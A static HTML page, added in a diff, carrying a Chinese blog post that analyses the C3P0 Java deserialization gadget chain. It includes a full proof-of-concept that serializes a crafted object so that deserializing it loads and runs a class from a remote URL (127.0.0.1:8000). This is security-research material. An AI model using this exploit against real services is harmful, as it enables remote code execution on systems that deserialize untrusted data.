@@ -1,0 +1,352 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>C3P0反序列化链 | ch1e的自留地</title>
+<link rel="shortcut icon" href="https://ch0x01e.github.io/favicon.ico?v=1709471671274">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://ch0x01e.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="C3P0反序列化链 | ch1e的自留地 - Atom Feed" href="https://ch0x01e.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="C3P0反序列化链
+正文
+
+C3P0是一个开源的JDBC连接池，它实现了数据源和JNDI绑定，支持JDBC3规范和JDBC2的标准扩展。目前使用它的开源项目有Hibernate、Spring等。------su18
+
+入口点是PoolBac..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://ch0x01e.github.io">
+  <img class="avatar" src="https://ch0x01e.github.io/images/avatar.png?v=1709471671274" alt="">
+  </a>
+  <h1 class="site-title">
+    ch1e的自留地
+  </h1>
+  <p class="site-description">
+    Manners maketh man
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://ch1e.cn/post/friends" class="menu">
+          友链
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              C3P0反序列化链
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-10-16
+              </span>
+              <span>
+                5 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="c3p0反序列化链">C3P0反序列化链</h1>
+<h2 id="正文">正文</h2>
+<blockquote>
+<p>C3P0是一个开源的JDBC连接池，它实现了数据源和JNDI绑定，支持JDBC3规范和JDBC2的标准扩展。目前使用它的开源项目有Hibernate、Spring等。------su18</p>
+</blockquote>
+<p>入口点是PoolBackedDataSourceBase，来看他readObject方法</p>
+<pre><code class="language-java">private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
+    short version = ois.readShort();
+    switch (version) {
+        case 1:
+            Object o = ois.readObject();
+            if (o instanceof IndirectlySerialized) {
+                o = ((IndirectlySerialized)o).getObject();
+            }
+
+            this.connectionPoolDataSource = (ConnectionPoolDataSource)o;
+            this.dataSourceName = (String)ois.readObject();
+            this.factoryClassLocation = (String)ois.readObject();
+            this.identityToken = (String)ois.readObject();
+            this.numHelperThreads = ois.readInt();
+            this.pcs = new PropertyChangeSupport(this);
+            this.vcs = new VetoableChangeSupport(this);
+            return;
+        default:
+            throw new IOException(&quot;Unsupported Serialized Version: &quot; + version);
+    }
+}
+</code></pre>
+<p>先读了一个version，当version为1，读入一个对象，判断是否是IndirectlySerialized类的对象，如果是则调用getObject方法。这个类有一个实现类是ReferenceIndirector，getObject方法如下</p>
+<pre><code class="language-java">public Object getObject() throws ClassNotFoundException, IOException {
+    try {
+        InitialContext initialContext;
+        if (this.env == null) {
+            initialContext = new InitialContext();
+        } else {
+            initialContext = new InitialContext(this.env);
+        }
+
+        Context nameContext = null;
+        if (this.contextName != null) {
+            nameContext = (Context)initialContext.lookup(this.contextName);
+        }
+
+        return ReferenceableUtils.referenceToObject(this.reference, this.name, nameContext, this.env);
+    } catch (NamingException var3) {
+        if (ReferenceIndirector.logger.isLoggable(MLevel.WARNING)) {
+            ReferenceIndirector.logger.log(MLevel.WARNING, &quot;Failed to acquire the Context necessary to lookup an Object.&quot;, var3);
+        }
+
+        throw new InvalidObjectException(&quot;Failed to acquire the Context necessary to lookup an Object: &quot; + var3.toString());
+    }
+}
+</code></pre>
+<p>env和contextName都为空的情况下，调用referenceToObject，跟进</p>
+<pre><code class="language-java">public static Object referenceToObject(Reference ref, Name name, Context nameCtx, Hashtable env) throws NamingException {
+    try {
+        String fClassName = ref.getFactoryClassName();
+        String fClassLocation = ref.getFactoryClassLocation();
+        Object cl;
+        if (fClassLocation == null) {
+            cl = ClassLoader.getSystemClassLoader();
+        } else {
+            URL u = new URL(fClassLocation);
+            cl = new URLClassLoader(new URL[]{u}, ClassLoader.getSystemClassLoader());
+        }
+
+        Class fClass = Class.forName(fClassName, true, (ClassLoader)cl);
+        ObjectFactory of = (ObjectFactory)fClass.newInstance();
+        return of.getObjectInstance(ref, name, nameCtx, env);
+    } catch (Exception var9) {
+        if (logger.isLoggable(MLevel.FINE)) {
+            logger.log(MLevel.FINE, &quot;Could not resolve Reference to Object!&quot;, var9);
+        }
+
+        NamingException ne = new NamingException(&quot;Could not resolve Reference to Object!&quot;);
+        ne.setRootCause(var9);
+        throw ne;
+    }
+}
+</code></pre>
+<p>获取了引用对象的类名和位置。使用了 URLClassLoader 从 URL 中加载了类并实例化。所以只需要把类名和恶意的url构造进去即可。</p>
+<figure data-type="image" tabindex="1"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220823151923143.png" alt="image-20220823151923143" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220823152115751.png" alt="image-20220823152115751" loading="lazy"></figure>
+<p>这里有个小坑哈哈，有段时间没学java了，这个恶意类需要从本地删除，不然他如果本地能找到就不会从url那去找了，我开始疑惑了半天，发现url乱写也能弹计算器。</p>
+<h2 id="构造">构造</h2>
+<p>直接拿别的师傅的poc了吧，自己写太麻烦哩</p>
+<pre><code class="language-java">package c3p0;
+
+import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
+
+import javax.naming.NamingException;
+import javax.naming.Reference;
+import javax.naming.Referenceable;
+import javax.sql.ConnectionPoolDataSource;
+import javax.sql.PooledConnection;
+import java.io.*;
+import java.lang.reflect.Field;
+import java.sql.SQLException;
+import java.sql.SQLFeatureNotSupportedException;
+import java.util.logging.Logger;
+
+public class C3P0 {
+    public static void main(String[] args) throws Exception{
+        PoolBackedDataSourceBase poolBackedDataSourceBase = new PoolBackedDataSourceBase(false);
+        PoolSource poolSource = new PoolSource(&quot;Demo1&quot;,&quot;http://127.0.0.1:8000/&quot;);
+        Field connectionPoolDataSourceField = PoolBackedDataSourceBase.class.getDeclaredField(&quot;connectionPoolDataSource&quot;);
+        connectionPoolDataSourceField.setAccessible(true);
+        connectionPoolDataSourceField.set(poolBackedDataSourceBase,poolSource);
+        serialize(poolBackedDataSourceBase,&quot;2.bin&quot;);
+        unserialize(&quot;2.bin&quot;);
+    }
+
+    private static class PoolSource implements ConnectionPoolDataSource, Referenceable {
+        private String classFactory;
+        private String classFactoryLocation;
+        public PoolSource(String classFactory, String classFactoryLocation){
+            this.classFactory = classFactory;
+            this.classFactoryLocation = classFactoryLocation;
+        }
+        @Override
+        public Reference getReference() throws NamingException {
+            return new Reference(&quot;feng&quot;,this.classFactory,this.classFactoryLocation);
+        }
+
+        @Override
+        public PooledConnection getPooledConnection() throws SQLException {
+            return null;
+        }
+
+        @Override
+        public PooledConnection getPooledConnection(String user, String password) throws SQLException {
+            return null;
+        }
+
+        @Override
+        public PrintWriter getLogWriter() throws SQLException {
+            return null;
+        }
+
+        @Override
+        public void setLogWriter(PrintWriter out) throws SQLException {
+
+        }
+
+        @Override
+        public void setLoginTimeout(int seconds) throws SQLException {
+
+        }
+
+        @Override
+        public int getLoginTimeout() throws SQLException {
+            return 0;
+        }
+
+        @Override
+        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
+            return null;
+        }
+    }
+    public static void serialize(Object obj,String fileName) throws Exception{
+        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream(fileName));
+        oos.writeObject(obj);
+    }
+    public static Object unserialize(String filename) throws Exception{
+        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(filename));
+        Object o = ois.readObject();
+        return o;
+    }
+}
+</code></pre>
+<h2 id="参考">参考</h2>
+<p>https://su18.org/post/ysoserial-su18-5/</p>
+<p>https://javasec.org/javase/JNDI/</p>
+<p>https://blog.csdn.net/rfrder/article/details/123208761</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#c3p0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE">C3P0反序列化链</a>
+<ul>
+<li><a href="#%E6%AD%A3%E6%96%87">正文</a></li>
+<li><a href="#%E6%9E%84%E9%80%A0">构造</a></li>
+<li><a href="#%E5%8F%82%E8%80%83">参考</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://ch0x01e.github.io/post/behinder/">
+              <h3 class="post-title">
+                Behinder源码初探
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://ch0x01e.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
